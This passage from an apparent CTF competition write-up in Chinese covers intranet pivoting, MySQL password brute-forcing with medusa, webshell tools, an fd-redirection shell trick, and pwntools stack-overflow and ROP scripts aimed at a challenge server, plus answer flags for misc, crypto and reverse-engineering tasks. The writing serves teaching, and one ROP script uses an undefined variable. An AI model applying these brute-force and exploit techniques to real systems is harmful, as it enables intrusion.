+<p>ls 一下可以看到当前的目录，我们去找一下 <code>/flag</code>，当然找不到，因为不在这个服务器上，但是可以找到一个 <code>hint.txt</code> </p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004417.png" alt="image-20200601004417726"></p>
+<p>flag 不在这台服务器，看样子接下来就是内网探测了，我们 <code>route -n</code> 可以看一下目前的网关。</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153541.png" alt="image-20200526153541496"></p>
+<p>用 <code>ifconfig</code> 可以看到当前主机的网络</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153553.png" alt="image-20200526153553563"></p>
+<p><code>hint.txt</code> 已经说了善用工具，且题目非常贴心地安装了 <code>nmap</code>，于是 <code>nmap -sP 192.168.1.0/24</code> 扫描内网存活主机，发现 ip 为 <code>192.168.1.123</code> 的存活主机，因此那就是下一步需要的搞的机。</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153648.png" alt="image-20200526153648330"></p>
+<p><code>curl 192.168.1.123</code> 和 <code>curl 192.168.1.110</code> 发现没有回显，当然因为没有开 http 服务，我们先扫描一下看看开放了什么端口，用 <code>nmap -p 1-65535 192.168.1.123</code>  <code>nmap -p 1-65535 192.168.1.110</code>来扫描全部端口，发现很贴心地只开了一个 <code>9997</code> 端口，那只有是它了。</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153827.png" alt="image-20200526153827321"></p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153806.png" alt="image-20200526153805961"></p>
+<p>直接 <code>nc 192.168.1.123 9997</code>  连上去，发现贴心地提醒了要以 admin 登陆，我们没有密码，另一个服务器贴心地刚好开了 mysql，那不难想到用户名密码在数据库里面，因此我们尝试爆破一下<code>mysql</code> 密码，这里没有提供字典，因此需要自己想办法把字典搞进去，可以将字典放在自己服务器，然后用 <code>wget</code> 或者 <code>curl</code>把字典带进去，当然蚁剑等工具也是可以的。这里又贴心地装了 <code>Medusa</code>，爆破 mysql 的软件常用是 <code>hydra</code> 和 <code>medusa</code> ，百度一下就知道了，没有装<code>hydra</code>，那用 <code>medusa</code>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.1.110 -u wust -P wordlists.txt -M mysql</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154141.png" alt="image-20200526154141877"></p>
+<p>爆出了密码 <code>iloveyou</code>，这里也安装好了 <code>mysql-client</code>，命令远程登陆：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uwust -p -h 192.168.1.110</span><br><span class="line">mysql -uwust -piloveyou -h 192.168.1.110</span><br></pre></td></tr></table></figure>
+
+<p>我在测试的时候出现反弹 shell 的时候进行 mysql 交互是没有回显，其实这个点有点意外，一开始 debug 了好久，差点要改题目了，但是后来发现还是可以做的，可以用 <code>mysql -uwust -piloveyou -h 192.168.1.110</code> 连上去后，直接开始执行查询语句，然后输入一个错误的语句，报错后就会输出原本的信息了，原因应该是回显到缓冲区了，报错断开会话后就会显示信息.</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133324.png" alt="image-20200531133317526"></p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133343.png" alt="image-20200531133343348"></p>
+<p>当然如果你选择用工具连上去，蚁剑<strong>终端</strong>是不能创建 mysql，ssh 等交互式会话的，用数据库的模块：</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133952.png" alt="image-20200531133952593"></p>
+<p>也可以尝试冰蝎，一套操作都写好了。</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200529234531.png" alt="image-20200529234530994"></p>
+<p>也可以用数据库管理工具挂个代理就连上去，<code>navicat</code> 或者 <code>sqllog</code> 都可以直接查库。</p>
+<p>查数据库：</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154351.png" alt="image-20200526154351359"></p>
+<p>查表：</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154417.png" alt="image-20200526154417752"></p>
+<p>然后直接查用户就可以了</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200529235205.png" alt="image-20200529235205910"></p>
+<p>就三个，找到对的一个回去登陆后发现有一行字：</p>
+<p><code>You take my shell, but my port is closed, my network is closed, everything is closed.</code></p>
+<p>提示了 <code>closed</code>，无论怎么输入都没有回显，也就关闭了标准输出，所以需要资源重定向。</p>
+<p>提示也给出了源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(<span class="number">1</span>); </span><br><span class="line"><span class="built_in">close</span>(<span class="number">2</span>); </span><br><span class="line"><span class="keyword">return</span> shell(); </span><br><span class="line"><span class="comment">//输出重定向</span></span><br></pre></td></tr></table></figure>
+
+<p>老套路，百度就有，理解一下就可以做了，也可以参考校赛 <code>pwn 题 closed</code> 的 <code>payload</code>， 一打就行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh 1&gt;&amp;0</span><br><span class="line"><span class="comment">#这个点不算pwn的知识，是操作系统基本知识，原理还是得了解一下</span></span><br></pre></td></tr></table></figure>
+
+<p>根据说明 <code>flag</code> 在 <code>/flag</code>，直接读取即可：</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154632.png" alt="image-20200526154632416"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="还是写题爽"><a href="#还是写题爽" class="headerlink" title="还是写题爽"></a>还是写题爽</h3><p>出题人: 0bs3rver</p>
+<p>其实出题想法是出题目好麻烦啊～</p>
+<p>写写题，写不出来就去看WP，嫖一波知识，多爽啊，哎</p>
+<p>拿到一个压缩包，打开是一个带密码的flag.7z和password文档，根据题目描述WTF想到Brainfuck密码（一点点脑洞），拿到这里解开<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
+<p>得到密码，解开可得一个二维码，但是定位块被我扣掉了，补上去一扫即可get flag。</p>
+<p>flag{chu_ti_hao_ma_fan}</p>
+<h3 id="Cry"><a href="#Cry" class="headerlink" title="Cry"></a>Cry</h3><p>​        是一个杰瑞笑哭的表情包。。。</p>
+<p>​        查看属性，没啥发现。</p>
+<p>​        丢进Winhex或者ida进行二进制分析。</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8saZV.png" alt="t8saZV.png"></p>
+<p>​        拉到最后发现flag：</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8sdaT.png" alt="t8sdaT.png"></p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Are-u-ok？"><a href="#Are-u-ok？" class="headerlink" title="Are u ok？"></a>Are u ok？</h3><p>出题人: 0bs3rver</p>
+<p>同拿到压缩包，打开是password文档和带密码压缩包，打开文档一看带=号，但其实并不是base64，考虑到是密码学分类，可能是一些乱七八糟的加密</p>
+<p>需要尝试一波，使用的是AES，密钥是题目描述：nobody is ok.</p>
+<p>即可得到密码，打开一看，又是乱七八糟的玩意，一大堆Ook，很明显就是这个加密，同样的在线网站解开，<a href="https://www.splitbrain.org/services/ook，即可get" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook，即可get</a> flag。</p>
+<p>flag{I’m not ok, ok?}</p>
+<h3 id="be-r"><a href="#be-r" class="headerlink" title="be@r"></a>be@r</h3><p>​        由熊大曰可以可以看出来是与熊论道编码，通过<a href="http://hi.pcmoe.net/index.html" target="_blank" rel="noopener">在线解码</a></p>
+<p>​        将熊大曰改为熊曰，解码得到flag</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8sDG4.png" alt="t8sDG4.png"></p>
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>根据题目名和题目描述可以猜到是迷宫类逆向</p>
+<p>比较困难的地方可能是c++，这玩意ida打开挺难看的</p>
+<p>程序逻辑是根据输入在8*8的方块内进行移动，一旦移动到 ‘Z’ 位置就错了，而且最后需要移动到 ‘W’ 位置，一共能移动十五次，只有一条道路可以进行选择，WSAD分别控制上下左右，输入就是flag</p>
+<p>附个源码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">64</span>] = &#123;</span><br><span class="line">  <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'W'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> a1=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> m)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Please input your flag:"</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; c;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">move</span>(c[i]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Wrong flag!"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">move</span>(c[<span class="number">14</span>]);</span><br><span class="line">    <span class="keyword">if</span>(a[a1] != <span class="string">'W'</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Wrong flag!"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Wow, you get right flag!"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (m) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'W'</span>:</span><br><span class="line">            a1 -= <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">            a1--;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">            a1 += <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">            a1++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a1&gt;<span class="number">0</span> &amp;&amp; a1&lt;<span class="number">63</span>)</span><br><span class="line">        <span class="keyword">if</span>(a[a1] == <span class="string">'P'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag{DSSDSSSDDWWDDDS}</p>
+<h3 id="ezbabyre"><a href="#ezbabyre" class="headerlink" title="ezbabyre"></a>ezbabyre</h3><p>拿到程序首先试着运行一波，会让你解三个数学 (?) 问题，但是解开并没有flag（笑</p>
+<p>扔进ida也看不出来啥，考虑到逆向分类，大概率是加壳，最常见的就是upx壳，linux下使用upx工具解开即可得到程序</p>
+<p>看起来很多，其实很容易就能找到关键函数（没办法，不到40kb不能upx加壳，只能静态编译了</p>
+<p>但是根据main函数走了一遍，啥也没有，继续寻找可以发现还有一个有函数名的函数从来没有调用过，打开一看，是输入和判定，推测这就是flag验证函数。</p>
+<p>程序逻辑是根据奇偶分别进行加密</p>
+<p>逆向算法也很简单，解开即可get flag</p>
+<p>这里也附一个源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check3</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">There</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="keyword">char</span> Flag[] = <span class="string">"flag is not here"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"I'll ask you some math questions, plz give me your answer.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"660 * x + 795 == 742 mod 2009\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span>(check1(x) == <span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What is the twenty-five prime number?\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span>(check2(x) == <span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Answer to the Ultimate Question of Life, the Universe, and Everything?\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span>(check3(x) == <span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    flag();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="number">660</span>*x+<span class="number">795</span>)%<span class="number">2009</span> != <span class="number">742</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong answer!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x != <span class="number">97</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong answer!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check3</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x != <span class="number">42</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong answer!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wow, You solved all the problems!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"But I have to say...\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s :P\n"</span>, Flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> f[] = <span class="string">"egbbxr3r\\tLp\\b0o\\mf\\o,zZEgbb~"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">There</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, b);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">29</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">            b[i] = b[i]^<span class="number">0x3</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            b[i] = b[i] - <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">29</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(f[i] != b[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Wrong!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag{w0w_yOu_g3t_real1y_Flag}</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="overflow-still"><a href="#overflow-still" class="headerlink" title="overflow_still"></a>overflow_still</h3><p>​        从题目可以看出来，这还是一个overflow的题目。</p>
+<p>​        在Ubuntu终端执行命令来远程运行程序。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10001</span><br></pre></td></tr></table></figure>
+
+<p>​        ELF文件丢入IDA分析，在左侧函数窗口可以找到两个主要函数：</p>
+<p>​        main():<img src="https://s1.ax1x.com/2020/06/01/t8sHsI.png" alt="t8sHsI.png"></p>
+<p>​        func():<img src="https://s1.ax1x.com/2020/06/01/t8sBiF.png" alt="t8sBiF.png"></p>
+<p>​        程序的逻辑是，只要a1的值等于0xcafebabe就能拿到flag。但是程序正常流程中没有修改a1的地方。</p>
+<p>​        不过找到了一个溢出点就是gets()。这个函数用起来虽然方便，但是并不对于输入长度进行检查，因此容易产生溢出，比较危险。</p>
+<p>​        在s变量声明代码旁边的注释可以找到[ebp-28h]，说明s距离栈底0x28字节，再将光标放在a1上:</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8swIU.png" alt="t8swIU.png"></p>
+<p>​        所以思路就是：对s变量进行溢出，覆盖掉a1，让它等于0xcafebabe。而溢出的量通过计算得：-0x28-0x8=0x30</p>
+<p>​        脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10001</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x30</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="rop-still"><a href="#rop-still" class="headerlink" title="rop_still"></a>rop_still</h3><p>​        又一个rop，绝对的基础知识😂。</p>
+<p>​        在Ubuntu终端执行命令来远程运行程序。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10002</span><br></pre></td></tr></table></figure>
+
+<p>​        ELF文件丢入IDA分析，在左侧函数窗口可以找到三个主要函数，</p>
+<p>​        main()：<a href="https://imgchr.com/i/t8s5Je" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/06/01/t8s5Je.png" alt="t8s5Je.png"></a></p>
+<p>​        nothing()：<img src="https://s1.ax1x.com/2020/06/01/t8sIRH.png" alt="t8sIRH.png"></p>
+<p>​        what_is_this()：<img src="https://s1.ax1x.com/2020/06/01/t8sozd.png" alt="t8sozd.png"></p>
+<p>​        发现system后门函数在what_is_this()中，而另外两个函数的正常执行流程是不会调用到这个函数的。</p>
+<p>​        再检查有没有其他漏洞点，发现nothing中，对buf变量的读入会发生溢出。</p>
+<p>​        和上个月的joke一样，利用到了栈帧的基础知识，对局部变量进行溢出，覆盖函数返回地址。</p>
+<p>​        查看buf变量右边的注释可以看到[ebp-38h]，也就是说buf变量距离栈底0x38字节，而在栈帧上，栈底往下的第一个地址是用来存旧的ebp的，栈底往下第二个地址存的就是返回地址，也就是我们要溢出的地址。</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8s7QA.png" alt="t8s7QA.png"></p>
+<p>​        因为read函数允许读入0x200个字节，长度足够，所以我们用0x38个’a’填满buf，用p32(0)填满旧ebp，再用what_is_this()的地址填充原来的返回地址，这样nothing函数执行结束后，系统就会跳转到what_is_this开始执行。</p>
+<p>​        脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">'./rop_still'</span>)</span><br><span class="line">what_addr = <span class="number">0x08048562</span></span><br><span class="line">p.recvuntil(<span class="string">"Not thing here..."</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x38</span>+p32(<span class="number">0</span>)+p32(addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h3><p>​        在Ubuntu终端执行命令来远程运行程序。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10000</span><br></pre></td></tr></table></figure>
+
+<p>​        发现貌似是一个猜数字的程序。</p>
+<p><a href="https://imgchr.com/i/t8srRJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/06/01/t8srRJ.png" alt="t8srRJ.png"></a></p>
+<p>​        丢ida分析一波。主要函数只有main函数。</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8ssz9.png" alt="t8ssz9.png"></p>
+<p>​        在程序中可以看到，v8变量是用随机数函数rand()函数生成的，每次的值都不一样。</p>
+<p>​        此处要注意<a href="https://www.cnblogs.com/guihailiuli/p/4154416.html" target="_blank" rel="noopener">伪随机数的知识</a>。</p>
+<p>​        大致的意思是，srand()和rand()函数可以配合使用生成随机数，rand()用来返回生成的值。rand()函数虽然能产生随机数，但是是通过srand的参数seed经过一定算法得出来的。换句话说，在函数算法不变的前提下，我们使用同样的参数seed，就可以得出同样的随机数。</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8s6MR.png" alt="t8s6MR.png"></p>
